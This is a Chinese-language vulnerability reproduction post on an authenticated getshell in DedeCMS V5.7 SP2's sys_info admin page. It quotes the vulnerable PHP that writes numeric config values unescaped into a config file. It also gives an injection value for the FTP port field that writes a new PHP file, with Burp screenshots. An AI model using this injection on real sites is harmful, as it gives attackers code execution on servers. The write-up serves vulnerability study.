---
title: dedecms V5.7 SP2后台sys_info Getshell
date: 2019-03-12 10:58:48
tags: [cms]
categories: dedecms
---

# dedecms V5.7 SP2后台sys_info Getshell(复现)

---

## 思路：

将恶意代码写入配置文件，通过文件包含来getshell

## 代码分析：

- dede/sys_info.php


```php
//保存配置的改动
if($dopost=="save")
{
    if(!isset($token)){
        echo 'No token found!';
        exit;
    }
	//验证token
    if(strcasecmp($token, $_SESSION['token']) != 0){
        echo 'Token mismatch!';
        exit;
    }
    foreach($_POST as $k=>$v)
    {
        if(preg_match("#^edit___#", $k))
        {
            $v = cn_substrR(${$k}, 1024);
        }
        else
        {
            continue;
        }
        $k = preg_replace("#^edit___#", "", $k);
        $dsql->ExecuteNoneQuery("UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' ");
    }
    //更新配置函数
    ReWriteConfig();
    ShowMsg("成功更改站点配置！", "sys_info.php");
    exit();
}
```

通过<font color="red">foreach($_POST as $k=>$v)</font>接收参数后，更新了数据库，接着进入<font color="red">ReWriteConfig()</font>函数更新配置。

- ReWriteConfig

  ```php
  //更新配置函数
  function ReWriteConfig()
  {
      global $dsql,$configfile;
      if(!is_writeable($configfile))
      {
          echo "配置文件'{$configfile}'不支持写入，无法修改系统配置参数！";
          exit();
      }
      $fp = fopen($configfile,'w');
      flock($fp,3);
      fwrite($fp,"<"."?php\r\n");
      $dsql->SetQuery("SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC ");
      $dsql->Execute();
      while($row = $dsql->GetArray())
      {
          if($row['type']=='number')
          {
              if($row['value']=='') $row['value'] = 0;
              fwrite($fp,"\${$row['varname']} = ".$row['value'].";\r\n");
          }
          else
          {
              fwrite($fp,"\${$row['varname']} = '".str_replace("'",'',$row['value'])."';\r\n");
          }
      }
      fwrite($fp,"?".">");
      fclose($fp);
  }
  ```

  这个函数将读取数据库来对配置文件进行更新，但是没有做验证。<font color="red">while($row = $dsql->GetArray())</font>中有两个分支，这里利用的是第一个分支，当类型为数字型的参数直接写入配置文件。

  接下来只要随便找一个默认数字型的参数就可以了。

  登入后台，在<font color="red">sys_info.php</font>搜索数字型的参数，这里以ftp为例

  ![001](/img/dedecms/dedecms_V5.7_SP2后台sys_info_getshell/001.png)

修改参数为：<font color="red">21;fputs(fopen("phpinfo.php", "w"), "<?php phpinfo(); ?>")</font>

burp包如下

![002](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/002.png)

查看返回包,修改配置成功

![003](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png)

生成phpinfo.php

![004](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/004.png)